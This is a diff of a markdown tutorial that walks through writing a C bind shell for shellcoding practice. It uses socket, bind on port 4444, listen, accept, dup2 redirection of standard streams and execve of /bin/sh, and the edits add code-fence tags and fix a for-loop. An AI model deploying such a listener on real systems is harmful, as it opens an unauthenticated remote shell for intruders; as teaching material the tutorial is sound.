@@ -37,14 +37,14 @@ DESCRIPTION
 
 Our C code is:
 
-```
+```C
 int my_socket = socket(AF_INET, SOCK_STREAM, 0);
 ```
 
 ### Bind
 Then socket must be bind. 
 
-```
+```C
 int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
 ```
   * *sockfd* is the socket we created, 
@@ -60,23 +60,23 @@ The sockaddr structure myst contain:
 
 In order to format the port number, htons must be used:
 
-```
+```C
        The htons() function converts the unsigned short integer hostshort from host byte order to network byte order.
 ```
 
 The bind part is:
-```
+```C
 struct sockaddr_in my_sockaddr;
 my_sockaddr.sin_family = AF_INET;
 my_sockaddr.sin_addr.s_addr = INADDR_ANY;
 my_sockaddr.sin_port = htons(4444);
 bind(my_socket, (struct sockaddr *)&my_sockaddr, sizeof(my_sockaddr));
 ```
-### Listen
+### Listen
 
 Lets start listening.
 
-```
+```C
 SYNOPSIS
        #include <sys/types.h>          /* See NOTES */
        #include <sys/socket.h>
@@ -88,15 +88,15 @@ DESCRIPTION
 ```
 C code is:
 
-```
+```C
 listen(my_socket, 0);
 ```
 
-### Accept
+### Accept
 
 Then, connections must be accepted.
 
-```
+```C
 SYNOPSIS
        #include <sys/types.h>           /* See NOTES */
        #include <sys/socket.h>
@@ -106,7 +106,7 @@ SYNOPSIS
 
 C code:
 
-```
+```C
 int my_accept = accept(my_socket, NULL, NULL);
 ```
 
@@ -114,7 +114,7 @@ int my_accept = accept(my_socket, NULL, NULL);
 
 Before executing our shell we need to redirect stdin, stdout and stderr to our socket. Again, lets use the man.
 
-```
+```C
 #include <unistd.h>
 int dup3(int oldfd, int newfd, int flags);
 ```
@@ -127,7 +127,7 @@ As a remember, file descriptor are (https://en.wikipedia.org/wiki/File_descripto
 
 Our code may be:
 
-```
+```C
 dup2(my_accept, 0);
 dup2(my_accept, 1);
 dup2(my_accept, 2);
@@ -135,16 +135,16 @@ dup2(my_accept, 2);
 
 Regarding C code, using a for loop do not have a huge interest, but as its for shellcoding purposes, lets use a for loop:
 
-```
+```C
 int i;
-for(i = 0; i++; i <3)
+for(i = 0; i < 3; i++)
 	dup2(my_accept, i);
 ```
 
 ### Execve
 
 At last we can finnaly call execve:
-```
+```C
 SYNOPSIS
        #include <unistd.h>
 
@@ -152,14 +152,14 @@ SYNOPSIS
                   char *const envp[]);
 ```
 
-```
+```C
 execve("/bin/sh", NULL, NULL);
 ```
 ### Code
 
 Lets try to compile it by removing the includes one by one in order to remove unecessary include. Finally there is a C Bind Shell:
 
-```
+```C
 #include <sys/socket.h>
 #include <unistd.h>
 #include <netinet/in.h>
